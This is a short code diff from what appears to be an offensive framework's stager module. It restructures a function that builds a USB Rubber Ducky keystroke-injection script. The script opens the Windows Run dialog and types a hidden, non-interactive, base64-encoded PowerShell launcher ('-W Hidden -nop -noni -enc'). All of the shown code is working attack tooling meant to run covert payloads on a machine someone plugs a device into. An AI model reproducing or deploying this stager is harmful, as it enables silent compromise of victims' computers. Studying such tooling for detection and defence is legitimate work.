@@ -141,23 +141,21 @@ class Stager:
         if launcher == "" or interpreter == "":
             log.error("[!] Error in launcher command generation.")
             return ""
+
+        enc = launcher.split(" ")[-1]
+
+        ducky_code = "DELAY 3000\n"
+        ducky_code += "GUI r\n"
+        ducky_code += "DELAY 1000\n"
+        ducky_code += "STRING " + interpreter + "\n"
+        ducky_code += "ENTER\n"
+        ducky_code += "DELAY 2000\n"
+
+        if obfuscate_script and "launcher" in obfuscate_command.lower():
+            ducky_code += "STRING " + launcher + " \n"
         else:
-            enc = launcher.split(" ")[-1]
+            ducky_code += "STRING powershell -W Hidden -nop -noni -enc " + enc + " \n"
 
-            ducky_code = "DELAY 3000\n"
-            ducky_code += "GUI r\n"
-            ducky_code += "DELAY 1000\n"
-            ducky_code += "STRING " + interpreter + "\n"
-            ducky_code += "ENTER\n"
-            ducky_code += "DELAY 2000\n"
+        ducky_code += "ENTER\n"
 
-            if obfuscate_script and "launcher" in obfuscate_command.lower():
-                ducky_code += "STRING " + launcher + " \n"
-            else:
-                ducky_code += (
-                    "STRING powershell -W Hidden -nop -noni -enc " + enc + " \n"
-                )
-
-            ducky_code += "ENTER\n"
-
-            return ducky_code
+        return ducky_code
